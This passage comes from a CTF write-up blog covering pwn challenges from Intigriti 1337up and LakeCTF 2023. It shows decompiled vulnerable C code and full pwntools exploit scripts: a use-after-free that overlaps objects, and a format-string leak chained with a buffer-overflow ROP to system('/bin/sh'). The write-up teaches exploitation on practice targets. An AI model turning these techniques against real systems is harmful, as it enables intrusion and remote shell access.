class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The condition of getting flag is in the <code>buy_swag_pack</code> function. I need to reconstruct <code>report-&gt;status</code> and <code>report-&gt;status</code> to get the flag.</p><p>The vulnerability is that only <code>user-&gt;bio</code> is freed in the logout function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">logout</span><span class="params">(<span class="keyword">struct</span> User *user)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;name, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;password, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memset</span>(user-&gt;bio, <span class="number">0</span>, user-&gt;bio_length);</span><br><span class="line">        <span class="built_in">free</span>(user-&gt;bio);    <span class="comment">// &lt;-- here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Since <code>bio-&gt;length</code> can be specified in the <code>register_user</code> function, it can be set to be the same as the size of the <code>report</code> object. This means that you can freely configure the <code>report</code> object using UAF.</p><h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./maltigriti&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;maltigriti.ctf.intigriti.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./maltigriti&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">length, bio</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name&gt;&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;password&gt;&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, bio)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_user</span>(<span class="params">new_bio, leak=<span class="number">0</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> leak:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;is: &#x27;</span>)</span><br><span class="line">        heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, new_bio)</span><br><span class="line">        <span class="keyword">return</span> heap</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;bio&gt;&#x27;</span>, new_bio)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_report</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;title&gt;&#x27;</span>, <span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;report&gt;&#x27;</span>, <span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_reports</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_balance</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_swag_pack</span>(): </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>(): </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;menu&gt;&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_user(<span class="number">0xc0</span>, <span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logout()        <span class="comment"># uaf</span></span><br><span class="line">new_report()    <span class="comment"># uaf í›„ ìž¬í• ë‹¹</span></span><br><span class="line">user = edit_user(<span class="string">b&#x27;BBBB&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">info(<span class="string">&#x27;user addr: &#x27;</span>+ <span class="built_in">hex</span>(user))</span><br><span class="line"></span><br><span class="line"><span class="comment"># user</span></span><br><span class="line"><span class="comment"># status A</span></span><br><span class="line"><span class="comment"># bounty 13337</span></span><br><span class="line"><span class="comment"># dummy 32</span></span><br><span class="line"><span class="comment"># dummy 128</span></span><br><span class="line"><span class="comment"># dummy </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(user)</span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(<span class="number">13337</span>)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">127</span> <span class="comment"># 128í•˜ë©´ 0xaë“¤ì–´ê°€ì„œ buy_sawg_packì—ì„œ í„°ì§</span></span><br><span class="line">edit_user(payload)</span><br><span class="line"></span><br><span class="line">buy_swag_pack()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INTIGRITI&#123;u53_4f73r_fr33_50und5_600d_70_m3&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> 1337up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2023 Write ups</title>
      <link href="/231106-lakectf2023-PWN/"/>
      <url>/231106-lakectf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2069">https://ctftime.org/event/2069</a></li></ul><h2 id="Scream-Into-The-Abyss-90-solves-x2F-50-points"><a href="#Scream-Into-The-Abyss-90-solves-x2F-50-points" class="headerlink" title="Scream Into The Abyss (90 solves &#x2F; 50 points)"></a>Scream Into The Abyss (90 solves &#x2F; 50 points)</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">save_msg</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> score)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  name = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">8uLL</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can now scream a longer message but before you do so, we&#x27;ll take your name: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(name);       <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Saved score of %d for %s. Date and Time: &quot;</span>, score, name);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  system(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now please add a message: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(format);     <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your message:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);   <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(byte_20B8);</span><br><span class="line">  <span class="keyword">return</span> fflush(_bss_start);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There are many vulns.</p><p>I used name address to save â€˜&#x2F;bin&#x2F;shâ€™.</p><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./abyss_scream&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">9001</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./abyss_scream&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x13b5</span></span><br><span class="line">ret = <span class="number">0x0101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>, <span class="string">b&#x27;x&#x27;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;message:&#x27;</span>, <span class="string">b&#x27;%41$p_%49$p&#x27;</span>) <span class="comment"># fsb, bof</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get name address and pie address using fsb</span></span><br><span class="line"><span class="comment"># name %41$p </span></span><br><span class="line"><span class="comment"># pie %49$p - 0x131e</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message:\n&#x27;</span>)</span><br><span class="line">name,pie = p.recvline().strip().split(<span class="string">b&#x27;_&#x27;</span>)</span><br><span class="line">name = <span class="built_in">int</span>(name, <span class="number">16</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(pie, <span class="number">16</span>) - <span class="number">0x131e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(name))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">e.address = pie</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system() using bof</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>, <span class="string">b&#x27;x&#x27;</span>) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">264</span> + <span class="number">8</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(e.address + pop_rdi)</span><br><span class="line">payload += p64(name)</span><br><span class="line">payload += p64(e.address + <span class="number">0x0101a</span>)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;message:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EPFL&#123;H3Y_C4LM_D0WN_N0_N33D_T0_SCR34M_S0_L0UD_1_C4N_H34R_Y0U!!!!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="capture-the-flaaaaaaaaaaaaag-63-solves-x2F-50-points"><a href="#capture-the-flaaaaaaaaaaaaag-63-solves-x2F-50-points" class="headerlink" title="capture the flaaaaaaaaaaaaag (63 solves &#x2F; 50 points)"></a>capture the flaaaaaaaaaaaaag (63 solves &#x2F; 50 points)</h2><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>There are all mitigations here. So I thought it would be as easy as just printing a flag, but it wasnâ€™t.</p><p>Letâ€™s dig into the code. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> ptr; <span class="comment">// [rsp+Bh] [rbp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flaaaaaaaaaaaaag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;cannot fopen the flaaaaaaaaaaaaag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">1uLL</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;cannot fread the flaaaaaaaaaaaaag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( fclose(stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;cannot fclose the flaaaaaaaaaaaaag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;At polygl0ts we are very cool, so you get the first flaaaaaaaaaaaaag character for free : %c\n&quot;</span>,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Figure out the rest yourself !&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">4</span>; (<span class="type">int</span>)i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You have %d action(s) left\n&quot;</span>, i);</span><br><span class="line">    menu();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( feedback )</span><br><span class="line">    <span class="built_in">free</span>(feedback);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no actions left :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>fread</code> internally calls <code>malloc</code> which will save the contents of the file. It has nothing to do with arguments of <code>fread</code>. After this, the heap memory is freed when <code>fclose</code> is called. This heap memory is only freed but not initialized, so its contents remain as is. It would be nice if I could reallocate this.</p><ul><li><code>malloc</code> at <code>&lt;_IO_doallocbuf+77&gt;</code> inside <code>fread</code> and <code>free</code> at <code>&lt;_IO_setb+84&gt;</code> inside <code>fclose</code>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">char</span> *address[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-48h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">26</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1 - read from file&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2 - read from memory&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3 - send feedback&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d%*c&quot;</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_QWORD *)buf = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;buf[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;filename &gt; &quot;</span>);</span><br><span class="line">      size = read(<span class="built_in">stdin</span>-&gt;_fileno, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">        buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        buf[size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      stream = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !stream )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cannot fopen %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !fgets(&amp;buf[<span class="number">16</span>], <span class="number">16</span>, stream) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cannot fgets %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( fclose(stream) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;cannot fclose %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;buf[<span class="number">16</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      address[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;address &gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%zx&quot;</span>, address);</span><br><span class="line">      <span class="built_in">puts</span>(address[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      address[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( feedback )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sorry, but that&#x27;s enough criticism for today !&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please share your thoughts with us&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        getline(&amp;feedback, &amp;n, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;thank you !&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In case 1, I can open <code>/proc/self/maps</code>.</p><ul><li><code>/proc</code>: This directory contains information about processes and the system.</li><li><code>self</code>: Itâ€™s a symbolic link to the process ID directory of the current process. So, &#x2F;- proc&#x2F;self refers to the process-specific directory for the process that accesses it.</li><li><code>maps</code>: This file contains a list of memory mappings for the process.</li></ul><p>In case 2, I can print the address where the given address is stored. So, Iâ€™ll get pie address using this.</p><p>In case 3, What is <code>getline</code>?<br>It calls <code>malloc</code> at <code>&lt;getdelim+110&gt;</code> inside <code>getline</code>. The heap address that was allocated when <code>fread</code> was called will be reallocated. And then, at <code>&lt;getdelim+248&gt;</code>, it receives a string from the keyboard and stores it in the heap. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Chunk(addr=0x555555559480, size=0x80, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="line">    [0x0000555555559480     66 61 6b 65 5f 66 6c 61 67 00 00 00 00 00 00 00    fake_flag.......]</span><br></pre></td></tr></table></figure><p>When I input one character like â€˜Aâ€™ with the keyboard, 3 bytes are input, including â€˜\nâ€™ and NULL. So When I print this address using case 2, I need to give <code>0x555555559480 + 3</code> as input.</p><h3 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 